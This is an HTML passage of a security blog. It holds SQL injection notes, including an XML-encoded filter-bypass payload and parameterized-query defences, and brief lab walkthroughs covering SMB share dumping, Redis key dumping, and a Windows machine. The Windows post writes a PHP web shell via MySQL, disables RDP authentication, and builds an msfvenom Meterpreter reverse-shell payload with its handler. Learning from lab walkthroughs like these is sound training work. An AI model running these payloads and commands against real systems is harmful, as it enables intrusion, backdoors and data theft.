+You can query the version details for the database. The way that this is done depends on the database type, so you can infer the database type from whichever technique works. For example, on Oracle you can execute:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">v$version</span>
+</code></pre></div>
+
+<p>You can also determine what database tables exist, and which columns they contain. For example, on most databases you can execute the following query to list the tables:</p>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span>
+</code></pre></div>
+
+<blockquote>
+<p><strong>Read more</strong>
+* [[Examining the database in SQL injection attacks]]
+* [[SQL injection cheat sheet]]</p>
+</blockquote>
+<hr>
+<h3>SQL injection in different contexts</h3>
+<p>In all of the labs so far, you've used the query string to inject your malicious SQL payload. However, it's important to note that you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.
+These different formats may even provide alternative ways for you to <a href="https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding">obfuscate attacks</a> that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often just look for common SQL injection keywords within the request, so you may be able to bypass these filters by simply encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the ==S== character in ==SELECT==:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;stockCheck&gt;</span>
+<span class="w">    </span><span class="nt">&lt;productId&gt;</span>
+<span class="w">    </span>123
+<span class="w">    </span><span class="nt">&lt;/productId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;storeId&gt;</span>
+<span class="w">    </span>999<span class="w"> </span><span class="ni">&amp;#x53;</span>ELECT<span class="w"> </span>*<span class="w"> </span>FROM<span class="w"> </span>information_schema.tables
+<span class="w">    </span><span class="nt">&lt;/storeId&gt;</span>
+<span class="w">    </span><span class="nt">&lt;/stockCheck&gt;</span>
+</code></pre></div>
+
+<p>This will be decoded server-side before being passed to the SQL interpreter.</p>
+<table>
+<thead>
+<tr>
+<th style="text-align: center;">🧪LAB APPRENTICE</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align: center;"><a href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding">SQL injection with filter bypass via XML encoding</a></td>
+</tr>
+</tbody>
+</table>
+<hr>
+<h3>How to prevent SQL injection</h3>
+<p>Most instances of SQL injection can be prevented by using parameterized queries (also known as prepared statements) instead of string concatenation within the query.
+The following code is vulnerable to SQL injection because the user input is concatenated directly into the query:</p>
+<div class="highlight"><pre><span></span><code><span class="n">String</span><span class="w"> </span><span class="n">query</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;SELECT * FROM products WHERE category = &#39;&quot;</span><span class="o">+</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&quot;&#39;&quot;</span><span class="p">;</span>
+<span class="w">    </span><span class="n">Statement</span><span class="w"> </span><span class="n">statement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="n">createStatement</span><span class="p">();</span>
+<span class="w">    </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="n">executeQuery</span><span class="p">(</span><span class="n">query</span><span class="p">);</span>
+</code></pre></div>
+
+<p>This code can be easily rewritten in a way that prevents the user input from interfering with the query structure:</p>
+<div class="highlight"><pre><span></span><code><span class="n">PreparedStatement</span><span class="w"> </span><span class="n">statement</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span><span class="n">prepareStatement</span><span class="p">(</span><span class="s">&quot;SELECT * FROM products WHERE category = ?&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="n">statement</span><span class="p">.</span><span class="n">setString</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">input</span><span class="p">);</span>
+<span class="w">    </span><span class="n">ResultSet</span><span class="w"> </span><span class="n">resultSet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">statement</span><span class="p">.</span><span class="n">executeQuery</span><span class="p">();</span>
+</code></pre></div>
+
+<p>Parameterized queries can be used for any situation where untrusted input appears as data within the query, including the ==WHERE== clause and values in an ==INSERT== or ==UPDATE== statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the ==ORDER BY== clause. Application functionality that places untrusted data into those parts of the query will need to take a different approach, such as white-listing permitted input values, or using different logic to deliver the required behavior.
+For a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant, and must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It is all too easy to make mistakes about the possible origin of data, or for changes in other code to violate assumptions about what data is tainted.</p>
+<blockquote>
+<p>Read more
+* <a href="https://portswigger.net/burp/vulnerability-scanner">Find SQL injection vulnerabilities using Burp Suite's web vulnerability scanner</a></p>
+</blockquote>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/sql-injection/">posted at 20:48</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/portswigger.html" rel="tag">PortSwigger</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/dancing/" rel="bookmark" title="Permanent Link to &quot;Dancing Machine&quot;">Dancing Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>Dancing Machine</h1>
+<h1>HTB/STARTING_POINT</h1>
+<p>In this machine we learn to enumerate SMB file shares.</p>
+<h3>To list shares</h3>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>smbclient<span class="w"> </span>-L<span class="w"> </span>//&lt;serverIP/name&gt;<span class="w"> </span>-N
+</code></pre></div>
+
+<h3>To download all file to a backup file become handing when u have a large file system</h3>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>smbclient<span class="w"> </span>//&lt;serverIP/name&gt;/&lt;shareDisk&gt;<span class="w"> </span>-N<span class="w"> </span>-Tc<span class="w"> </span>backup.tar
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/dancing/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/explosion/" rel="bookmark" title="Permanent Link to &quot;Explosion Machine&quot;">Explosion Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>Explosion</h1>
+<h1>HTB/STARTING_POINT</h1>
+<p>This machine teach you how to interact with RDP protocol and enumerate it .</p>
+<p>Let’s start by map to scan all open ports, since this machine is focused on RDP , we will reduce time by specifying the port on 3389 ;</p>
+<div class="highlight"><pre><span></span><code>
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/explosion/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/redeemer/" rel="bookmark" title="Permanent Link to &quot;Redeemer Machine&quot;">Redeemer Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>Redeemer</h1>
+<h1>HTB/STARTING_POINT</h1>
+<p>This machine show you how to interact with a Redis server .</p>
+<p>Doing Nmap scan show open port and specifically redid port open on :</p>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-T4<span class="w"> </span>-p-<span class="w"> </span>-oA<span class="w"> </span>nmap/Redeemer<span class="w"> </span>&lt;serverIp&gt;
+</code></pre></div>
+
+<p>Result :</p>
+<div class="highlight"><pre><span></span><code><span class="gp"># </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span>scan<span class="w"> </span>initiated<span class="w"> </span>Thu<span class="w"> </span>Aug<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">02</span>:07:23<span class="w"> </span><span class="m">2023</span><span class="w"> </span>as:<span class="w"> </span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span>-T4<span class="w"> </span>-p-<span class="w"> </span>-oA<span class="w"> </span>nmap/Redeemer<span class="w"> </span><span class="m">10</span>.129.6.102
+<span class="go">Warning: 10.129.6.102 giving up on port because retransmission cap hit (6).</span>
+<span class="go">Nmap scan report for 10.129.6.102</span>
+<span class="go">Host is up (0.11s latency).</span>
+<span class="go">Not shown: 65526 closed tcp ports (conn-refused)</span>
+<span class="go">PORT      STATE    SERVICE VERSION</span>
+<span class="go">6379/tcp  open     redis   Redis key-value store 5.0.7</span>
+<span class="go">23201/tcp filtered unknown</span>
+<span class="go">23819/tcp filtered unknown</span>
+<span class="go">25153/tcp filtered unknown</span>
+<span class="go">34008/tcp filtered unknown</span>
+<span class="go">35903/tcp filtered unknown</span>
+<span class="go">39049/tcp filtered unknown</span>
+<span class="go">40140/tcp filtered unknown</span>
+<span class="go">47535/tcp filtered unknown</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="gp"># </span>Nmap<span class="w"> </span><span class="k">done</span><span class="w"> </span>at<span class="w"> </span>Thu<span class="w"> </span>Aug<span class="w"> </span><span class="m">24</span><span class="w"> </span><span class="m">02</span>:25:02<span class="w"> </span><span class="m">2023</span><span class="w"> </span>--<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">1059</span>.07<span class="w"> </span>seconds
+</code></pre></div>
+
+<p>Connect to redis ;</p>
+<div class="highlight"><pre><span></span><code>kali@kali:~$<span class="w"> </span>redis-cli<span class="w"> </span>-h<span class="w"> </span>&lt;hostname/ip&gt;
+</code></pre></div>
+
+<p>Get all db ;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>config<span class="w"> </span>get<span class="w"> </span>databases
+</code></pre></div>
+
+<p>Get existed keys with correspond db index;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>info<span class="w"> </span>keyspace<span class="w"> </span>
+</code></pre></div>
+
+<p>Select desired db;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span><span class="k">select</span><span class="w"> </span>&lt;N&gt;
+</code></pre></div>
+
+<p>Get info on Redis server;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>info
+</code></pre></div>
+
+<p>Dump all keys;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>keys<span class="w"> </span>*
+</code></pre></div>
+
+<p>Get random keys;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>randomkey<span class="w"> </span>
+</code></pre></div>
+
+<p>Print specified key value;</p>
+<div class="highlight"><pre><span></span><code>redis-cli&gt;<span class="w"> </span>get<span class="w"> </span>&lt;keyname&gt;
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/redeemer/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>            <h4 class="date">May 19, 2024</h4>
+
+            <article class="post">
+                <h2 class="title">
+                    <a href="https://sfinx.kozow.com/2024/5/19/squid/" rel="bookmark" title="Permanent Link to &quot;Squid Machine&quot;">Squid Machine</a>
+                </h2>
+
+                
+                
+
+                <h1>SQUID - MACHINE / PG</h1>
+<h1>PG/easy_windows</h1>
+<p>This machine a proxy named squid that proxy all network traffic from outside . It operate on port 3128</p>
+<h4>Mysql 3306:</h4>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="ss">&quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="ss">&quot;C:\\xampp\\htdocs\\backdoor.php&quot;</span>
+</code></pre></div>
+
+<h4>Disable NLA;</h4>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>add<span class="w"> </span><span class="s2">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-TCP&quot;</span><span class="w"> </span>/v<span class="w"> </span>UserAuthentication<span class="w"> </span>/t<span class="w"> </span>REG_DWORD<span class="w"> </span>/d<span class="w"> </span><span class="s2">&quot;0&quot;</span><span class="w"> </span>/f
+</code></pre></div>
+
+<h4>Enable RDP on owned machine:</h4>
+<div class="highlight"><pre><span></span><code>reg<span class="w"> </span>add<span class="w"> </span><span class="s2">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span><span class="w"> </span>/v<span class="w"> </span>fDenyTSConnections<span class="w"> </span>/t<span class="w"> </span>REG_DWORD<span class="w"> </span>/d<span class="w"> </span><span class="m">0</span><span class="w"> </span>/f
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>netsh<span class="w"> </span>advfirewall<span class="w"> </span>firewall<span class="w"> </span><span class="nb">set</span><span class="w"> </span>rule<span class="w"> </span><span class="nv">group</span><span class="o">=</span><span class="s2">&quot;remote desktop&quot;</span><span class="w"> </span>new<span class="w"> </span><span class="nv">enable</span><span class="o">=</span>yes
+</code></pre></div>
+
+<h4>Reverse Shell with Meterpreter:</h4>
+<div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.0.17<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>--format<span class="o">=</span>exe<span class="w"> </span>&gt;<span class="w"> </span>evil.exe
+</code></pre></div>
+
+<div class="highlight"><pre><span></span><code>msf5&gt;<span class="w"> </span>use<span class="w"> </span>exploit/multi/handler
+msf5&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp
+msf5&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.0.17
+msf5&gt;<span class="w"> </span><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+msf5&gt;<span class="w"> </span>run
+</code></pre></div>
+                <div class="clear"></div>
+
+                <div class="info">
+                    <a href="https://sfinx.kozow.com/2024/5/19/squid/">posted at 19:10</a>
+                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/htb.html" rel="tag">HTB</a>
+                </div>
+            </article>
 
             <div class="clear"></div>
             <footer>
